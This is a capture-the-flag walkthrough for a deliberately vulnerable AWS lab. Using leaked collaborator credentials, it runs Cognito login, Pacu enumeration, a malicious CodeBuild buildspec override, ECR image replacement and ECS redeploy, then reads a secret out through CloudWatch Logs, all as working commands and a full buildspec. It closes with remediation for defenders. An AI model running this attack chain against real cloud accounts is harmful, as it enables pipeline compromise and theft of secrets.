# Walkthrough

## Environment

All commands run in **WSL or Linux/Mac terminal**.
The web portal (Step 1) is browser-only for reconnaissance — no direct interaction required.

> **Windows users:** Use WSL for all CLI commands. `pacu` requires WSL.

---

## Step 1: Reconnaissance

Access the developer portal and gather information.

```bash
cd scenarios/aws/03-supply-chain/dam-breaks/terraform
terraform output scenario_entrypoint_url
```

Open the URL in your browser to see the **BeaverPay Developer Portal**.

![BeaverPay Developer Portal](./assets/images/portal-homepage.png)

Key observations:
- Auth Endpoint: `cognito-idp.us-east-1.amazonaws.com`
- Auth Flow: `USER_PASSWORD_AUTH`
- MFA: `Optional`
- Resources: AWS CodeBuild, ECR, ECS Fargate

---

## Step 2: Cognito Authentication

### Step 2-1: Log in via the Developer Portal

Open the portal URL in your browser. Enter the leaked collaborator credentials:

- Email: `j.park@ottercode.kr`
- Password: `Otter2022!`

![BeaverPay Portal Login](./assets/images/portal-login.png)

The portal authenticates against Cognito User Pool using `USER_PASSWORD_AUTH` — no MFA challenge fires because MFA is set to **optional**.

After login, the dashboard automatically exchanges the Cognito JWT for temporary AWS credentials via the Identity Pool and displays them ready to copy:

Click **Copy as env vars** and paste into your terminal:

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="xxxxxxxx"
export AWS_SESSION_TOKEN="IQoJ..."
export AWS_DEFAULT_REGION="us-east-1"
```

### Step 2-1 (Alternative): CLI-only Authentication

If browser access is unavailable, obtain Collaborator credentials entirely via CLI.

First, retrieve the Cognito configuration from the portal's `/config` endpoint:

```bash
PORTAL_URL="http://<portal-ip>"
CONFIG=$(curl -s $PORTAL_URL/config)

CLIENT_ID=$(echo $CONFIG | python3 -c "import sys,json; print(json.load(sys.stdin)['clientId'])")
POOL_ID=$(echo $CONFIG | python3 -c "import sys,json; print(json.load(sys.stdin)['poolId'])")
IDENTITY_POOL_ID=$(echo $CONFIG | python3 -c "import sys,json; print(json.load(sys.stdin)['identityPoolId'])")
```

Then authenticate:

```bash
ID_TOKEN=$(aws cognito-idp initiate-auth \
  --auth-flow USER_PASSWORD_AUTH \
  --client-id "$CLIENT_ID" \
  --auth-parameters USERNAME=j.park@ottercode.kr,PASSWORD=Otter2022! \
  --region us-east-1 \
  --query 'AuthenticationResult.IdToken' \
  --output text)

IDENTITY_ID=$(aws cognito-identity get-id \
  --identity-pool-id "$IDENTITY_POOL_ID" \
  --logins "cognito-idp.us-east-1.amazonaws.com/${POOL_ID}=$ID_TOKEN" \
  --region us-east-1 \
  --query 'IdentityId' \
  --output text)

CREDS=$(aws cognito-identity get-credentials-for-identity \
  --identity-id "$IDENTITY_ID" \
  --logins "cognito-idp.us-east-1.amazonaws.com/${POOL_ID}=$ID_TOKEN" \
  --region us-east-1 \
  --query 'Credentials')

export AWS_ACCESS_KEY_ID=$(echo $CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['AccessKeyId'])")
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['SecretKey'])")
export AWS_SESSION_TOKEN=$(echo $CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['SessionToken'])")
export AWS_DEFAULT_REGION="us-east-1"
```

> The portal performs this same sequence client-side. `initiate-auth` authenticates against the User Pool, `get-id` resolves the Identity Pool identity, and `get-credentials-for-identity` exchanges the JWT for temporary AWS credentials via `AssumeRoleWithWebIdentity`.

### Step 2-2: Verify Identity

```bash
aws sts get-caller-identity
```

Output:
```json
{
  "Arn": "arn:aws:sts::123456789012:assumed-role/dam-breaks-CollaboratorDeveloperRole-xxxxxxxx/CognitoIdentityCredentials"
}
```

You are now authenticated as `CollaboratorDeveloperRole` — a role with limited but exploitable AWS permissions.

> **Under the hood:** The portal calls `cognito-identity:GetId` then `cognito-identity:GetCredentialsForIdentity` client-side using your IdToken. The Identity Pool maps authenticated Cognito users to `CollaboratorDeveloperRole` via `AssumeRoleWithWebIdentity`. No additional configuration is needed.

---

## Step 3: IAM Enumeration with Pacu

```bash
pacu
```

Inside Pacu:

```
Pacu (dam-breaks:No Keys Set) > 0
  Session name: dam-breaks

Pacu (dam-breaks:No Keys Set) > set_keys
  Key alias: collaborator
  Access key ID: ASIA...
  Secret access key: xxxxxx
  Session token (optional): IQoJ...

Pacu (dam-breaks:collaborator) > run iam__enum_permissions
```

Output:
```
[iam__enum_permissions] Enumerating permissions for: collaborator

[iam__enum_permissions] Starting permission enumeration via iam:SimulatePrincipalPolicy...

[+] Confirmed ALLOWED actions:
  iam:SimulatePrincipalPolicy     ← this call itself — Pacu uses it to enumerate
  iam:GetRole
  iam:GetRolePolicy
  iam:ListRolePolicies
  iam:ListAttachedRolePolicies
  codebuild:ListProjects
  codebuild:BatchGetProjects
  codebuild:StartBuild            ← no Condition on buildspec — override possible
  codebuild:BatchGetBuilds
  ecr:GetAuthorizationToken
  ecr:DescribeRepositories
  ecr:DescribeImages
  ecs:ListClusters
  ecs:ListServices
  ecs:DescribeServices
  ecs:DescribeTaskDefinition
  ecs:ListTasks
  ecs:DescribeTasks
  logs:DescribeLogGroups
  logs:DescribeLogStreams
  logs:GetLogEvents
  logs:FilterLogEvents

[-] Confirmed DENIED actions:
  codebuild:UpdateProject         ← persistent project modification blocked
  codebuild:DeleteProject
  ecr:PutImage                    ← direct ECR push blocked (must go through CodeBuild)
  secretsmanager:ListSecrets      ← direct Secrets Manager access blocked
  secretsmanager:GetSecretValue
  iam:AttachRolePolicy
  iam:CreateRole

[iam__enum_permissions] Pacu data saved: iam__enum_permissions
```

### Why `codebuild:StartBuild` is the critical finding

When Pacu confirms `codebuild:StartBuild` is allowed, the key question is: **is there an IAM Condition restricting which buildspec can be used?**

Use `iam:GetRolePolicy` to inspect the policy directly. Replace `xxxxxxxx` with the 8-character suffix visible in the ARN from Step 2-2.

```bash
aws iam get-role-policy \
  --role-name "dam-breaks-CollaboratorDeveloperRole-xxxxxxxx" \
  --policy-name "dam-breaks-collaborator-policy-xxxxxxxx" \
  --query 'PolicyDocument.Statement[?Sid==`CodeBuildAccess`]'
```

Output:
```json
[
  {
    "Sid": "CodeBuildAccess",
    "Effect": "Allow",
    "Action": [
      "codebuild:ListProjects",
      "codebuild:BatchGetProjects",
      "codebuild:StartBuild",
      "codebuild:BatchGetBuilds"
    ],
    "Resource": "*"
  }
]
```

No `Condition` block. A secure configuration would include:

```json
{
  "Condition": {
    "StringEquals": {
      "codebuild:buildspec": "buildspec.yaml"
    }
  }
}
```

Without this Condition, `--buildspec-override` accepts any arbitrary buildspec.

Key findings:
- `codebuild:StartBuild` with no Condition → `buildspecOverride` is unrestricted
- `ecr:PutImage` denied → ECR push must go through CodeBuild (attack path is forced through the build pipeline)
- `secretsmanager` denied → Secrets Manager access requires ECS Task Role — exploitable via CloudWatch Logs exfiltration

---

## Step 4: CodeBuild Reconnaissance

```bash
aws codebuild list-projects --region us-east-1
```

Output:
```json
{
  "projects": [
    "dam-breaks-webapp-qa-build-xxxxxxxx",
    "dam-breaks-webapp-prod-build-xxxxxxxx"
  ]
}
```

```bash
aws codebuild batch-get-projects \
  --names "dam-breaks-webapp-prod-build-xxxxxxxx" \
  --region us-east-1
```

Output:
```json
{
  "projects": [{
    "environment": {
      "environmentVariables": [
        { "name": "REPOSITORY_URI", "value": "123456789012.dkr.ecr.us-east-1.amazonaws.com/dam-breaks-beaverpay-webapp-xxxxxxxx" },
        { "name": "AWS_DEFAULT_REGION", "value": "us-east-1" },
        { "name": "ECS_CLUSTER",  "value": "dam-breaks-prod-cluster-xxxxxxxx" },
        { "name": "ECS_SERVICE",  "value": "dam-breaks-webapp-service-xxxxxxxx" },
        { "name": "SECRET_ARN",   "value": "arn:aws:secretsmanager:us-east-1:123456789012:secret:beaverpay/prod/flag-xxxxxxxx" }
      ]
    },
    "serviceRole": "arn:aws:iam::123456789012:role/dam-breaks-CodeBuildProdServiceRole-xxxxxxxx"
  }]
}
```

`ECS_CLUSTER`, `ECS_SERVICE`, `SECRET_ARN` — these values are exposed here and can be referenced directly inside the malicious buildspec.

---

## Step 5: ECR Reconnaissance

```bash
aws ecr describe-repositories \
  --region us-east-1 \
  --query 'repositories[0].{name:repositoryName,uri:repositoryUri,mutability:imageTagMutability}'
```

Output:
```json
{
  "name": "dam-breaks-beaverpay-webapp-xxxxxxxx",
  "uri": "123456789012.dkr.ecr.us-east-1.amazonaws.com/dam-breaks-beaverpay-webapp-xxxxxxxx",
  "mutability": "MUTABLE"
}
```

Key findings:
- `MUTABLE` — `latest` tag can be overwritten without restriction

---

## Step 6: ECS Reconnaissance

```bash
aws ecs describe-services \
  --cluster "dam-breaks-prod-cluster-xxxxxxxx" \
  --services "dam-breaks-webapp-service-xxxxxxxx" \
  --region us-east-1 \
  --query 'services[0].{deploymentController:deploymentController,circuitBreaker:deploymentConfiguration.deploymentCircuitBreaker}'
```

Output:
```json
{
  "deploymentController": { "type": "ECS" },
  "circuitBreaker": { "enable": false, "rollback": false }
}
```

```bash
aws ecs describe-task-definition \
  --task-definition "dam-breaks-webapp-xxxxxxxx" \
  --region us-east-1 \
  --query 'taskDefinition.taskRoleArn' \
  --output text
```

Output:
```
arn:aws:iam::123456789012:role/dam-breaks-ecs-task-role-xxxxxxxx
```

Key findings:
- Rolling deployment (`ECS`) — no manual approval gate
- Circuit breaker disabled — no automatic rollback
- `latest` tag referenced — image replacement reflected immediately
- Task Role confirmed — Secrets Manager access expected

---

## Step 7: buildspec-override Attack

### Step 7-1: Create malicious buildspec file

The malicious image replaces the legitimate webapp container. Once deployed by ECS, it reads the flag from Secrets Manager using the ECS Task Role and outputs it to stdout — which CloudWatch Logs captures automatically.

```bash
cat > /tmp/buildspec.json << 'EOF'
{
  "version": "0.2",
  "phases": {
    "pre_build": {
      "commands": [
        "aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin $REPOSITORY_URI"
      ]
    },
    "build": {
      "commands": [
        "mkdir -p /tmp/app",
        "echo '#!/bin/sh' > /tmp/app/exfil.sh",
        "echo \"aws secretsmanager get-secret-value --secret-id $SECRET_ARN --region us-east-1 --query SecretString --output text\" >> /tmp/app/exfil.sh",
        "echo 'sleep infinity' >> /tmp/app/exfil.sh",
        "printf 'FROM public.ecr.aws/docker/library/alpine:3\\nRUN apk add --no-cache aws-cli\\nCOPY exfil.sh /exfil.sh\\nRUN chmod +x /exfil.sh\\nCMD [\"/exfil.sh\"]\\n' > /tmp/app/Dockerfile",
        "docker build -t $REPOSITORY_URI:latest /tmp/app/"
      ]
    },
    "post_build": {
      "commands": [
        "docker push $REPOSITORY_URI:latest",
        "aws ecs update-service --cluster $ECS_CLUSTER --service $ECS_SERVICE --force-new-deployment --region us-east-1"
      ]
    }
  }
}
EOF
```

> **Why no reverse shell:** No attacker-controlled listener is needed. The ECS Task Role already has `secretsmanager:GetSecretValue` on the flag ARN — the container only needs to call the AWS API and log the result. CloudWatch Logs is already configured on this ECS cluster, so all container stdout is captured automatically.

> `$SECRET_ARN` is expanded to the actual ARN value (discovered in Step 4) **during the CodeBuild build phase** and baked directly into `exfil.sh`. When the ECS task container runs, it has the hardcoded ARN — no CodeBuild variables are passed to ECS.

> `$ECS_CLUSTER`, `$ECS_SERVICE` — inherited from the CodeBuild project's environment variables (discovered in Step 4). They remain available even when the entire buildspec is replaced via `buildspecOverride`.

### Step 7-2: Execute malicious build

```bash
aws codebuild start-build \
  --project-name "dam-breaks-webapp-prod-build-xxxxxxxx" \
  --buildspec-override file:///tmp/buildspec.json \
  --region us-east-1 \
  --query 'build.{id:id,status:buildStatus}'
```

Output:
```json
{
    "id": "dam-breaks-webapp-prod-build-xxxxxxxx:<build-uuid>",
    "status": "IN_PROGRESS"
}
```

Copy the `id` value from the output above, then poll for completion:

```bash
BUILD_ID="dam-breaks-webapp-prod-build-xxxxxxxx:<build-uuid>"
aws codebuild batch-get-builds \
  --ids "$BUILD_ID" \
  --region us-east-1 \
  --query 'builds[0].buildStatus'
```

Expected output when complete:
```
"SUCCEEDED"
```

> **Note:** Git repository is untouched. Source code modification occurred only inside the build server memory.

---

## Step 8: ECS Deployment

The malicious buildspec's `post_build` phase runs `aws ecs update-service --force-new-deployment`. The CodeBuild service role has `ecs:UpdateService` — this call is not blocked. ECS starts a rolling deployment with the new `:latest` image.

```bash
aws ecs wait services-stable \
  --cluster "dam-breaks-prod-cluster-xxxxxxxx" \
  --services "dam-breaks-webapp-service-xxxxxxxx" \
  --region us-east-1
```

> **Note:** `ecs wait` may return immediately. Verify the service is actually stable by running:

```bash
aws ecs describe-services \
  --cluster "dam-breaks-prod-cluster-xxxxxxxx" \
  --services "dam-breaks-webapp-service-xxxxxxxx" \
  --region us-east-1 \
  --query 'services[0].{running:runningCount,pending:pendingCount,desired:desiredCount}'
```

Expected output:
```json
{
    "running": 1,
    "pending": 0,
    "desired": 1
}
```

Once `running` equals `desired` and `pending` is 0, the exfiltration container has started and called Secrets Manager using the ECS Task Role.

---

## Step 9: FLAG Extraction via CloudWatch Logs

The ECS task definition specifies CloudWatch Logs as its log driver — all container stdout is forwarded automatically. The Collaborator role has `logs:FilterLogEvents` on `/ecs/*` log groups, which is standard read access for a developer debugging their application.

Replace `xxxxxxxx` with the suffix from Step 2-2.

```bash
aws logs filter-log-events \
  --log-group-name "/ecs/dam-breaks-webapp-xxxxxxxx" \
  --region us-east-1 \
  --filter-pattern "flag" \
  --query 'events[0].message' \
  --output text
```

Output:
```json
{
  "flag": "FLAG{th3_c0mm1t_w4s_cl34n_but_y0u_w3r3_n0t}",
  "message": "Congratulations. The dam has broken.",
  "internal_note": "The build succeeded. The logs are clean. Nobody noticed.",
  "git_status": "nothing to commit, working tree clean",
  "build_status": "BUILD SUCCEEDED"
}
```

---

## Attack Chain Summary

```
BeaverPay Developer Portal
↓ Credential stuffing — no MFA, no ASF rate limiting
Cognito USER_PASSWORD_AUTH
↓ JWT obtained immediately, no MFA challenge
Cognito Identity Pool
↓ JWT → CollaboratorDeveloperRole temporary credentials
Pacu iam__enum_permissions
↓ codebuild:StartBuild allowed, no Condition → buildspecOverride unrestricted
↓ ecr:PutImage denied, secretsmanager denied → attack path forced through CodeBuild + ECS
iam:GetRolePolicy → IAM policy confirmed → Condition block missing
↓
CodeBuild batch-get-projects
↓ ECS_CLUSTER, ECS_SERVICE, SECRET_ARN environment variables exposed
buildspecOverride via file:///tmp/buildspec.json
↓ Malicious buildspec executed — Git repository untouched
ECR :latest push — MUTABLE tag overwritten
↓ Malicious image replaces legitimate image (Alpine + aws-cli, exfil.sh baked in)
ECS Rolling Deploy — no approval gate, circuit breaker disabled
↓ Malicious container started automatically (~3 min)
ECS Task Role: secretsmanager:GetSecretValue → flag output to stdout
↓ CloudWatch Logs captures container stdout automatically
logs:FilterLogEvents with CollaboratorDeveloperRole
↓
FLAG{th3_c0mm1t_w4s_cl34n_but_y0u_w3r3_n0t}
```

---

## Key Techniques

### buildspecOverride — Git Integrity Bypass

```bash
cat > /tmp/buildspec.json << 'EOF'
{ ... }
EOF

aws codebuild start-build \
  --buildspec-override file:///tmp/buildspec.json
```

### CloudWatch Logs as Exfiltration Channel

```bash
aws logs filter-log-events \
  --log-group-name "/ecs/dam-breaks-webapp-xxxxxxxx" \
  --filter-pattern "flag" \
  --query 'events[0].message' \
  --output text
```

### IAM Condition Missing — buildspec Lock Bypass

```json
{
  "Condition": {
    "StringEquals": {
      "codebuild:buildspec": "buildspec.yaml"
    }
  }
}
```

---

## Lessons Learned

1. **MFA Enforcement** — Set Cognito MFA to `REQUIRED`.
2. **IAM Resource Scope** — Specify exact project ARNs instead of wildcard `*`.
3. **buildspec Condition** — Add `codebuild:buildspec` IAM Condition to prevent `buildspecOverride`.
4. **ECR Image Signing** — Enforce image signature verification (AWS Signer / Cosign).
5. **Deployment Gate** — Use Blue/Green deployment with manual approval gate.
6. **ECS Outbound Restriction** — Restrict Security Group outbound to HTTPS only. Note: this prevents reverse shells but not CloudWatch Logs exfiltration (which uses HTTPS). Combine with least-privilege Task Role IAM policy.
7. **Build Alert Monitoring** — Treat CI/CD alerts as high-priority signals, not noise.

---

## Remediation

### Cognito — Enforce MFA

```hcl
resource "aws_cognito_user_pool" "developer_portal_userpool" {
  mfa_configuration = "ON"

  software_token_mfa_configuration {
    enabled = true
  }

  user_pool_add_ons {
    advanced_security_mode = "ENFORCED"
  }
}
```

### IAM — Restrict CodeBuild Permissions

```json
{
  "Effect": "Allow",
  "Action": ["codebuild:StartBuild"],
  "Resource": "arn:aws:codebuild:us-east-1:*:project/dam-breaks-webapp-qa-*",
  "Condition": {
    "StringEquals": {
      "codebuild:buildspec": "buildspec.yaml"
    }
  }
}
```

### ECR — Enforce Image Immutability

```hcl
resource "aws_ecr_repository" "webapp_ecr" {
  image_tag_mutability = "IMMUTABLE"
}
```

### ECS — Blue/Green Deployment with Approval

```hcl
resource "aws_ecs_service" "webapp_service" {
  deployment_controller {
    type = "CODE_DEPLOY"
  }
  deployment_circuit_breaker {
    enable   = true
    rollback = true
  }
}
```

### ECS Security Group — Restrict Outbound

```hcl
resource "aws_security_group" "ecs_task_sg" {
  egress {
    description = "HTTPS only"
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
}
```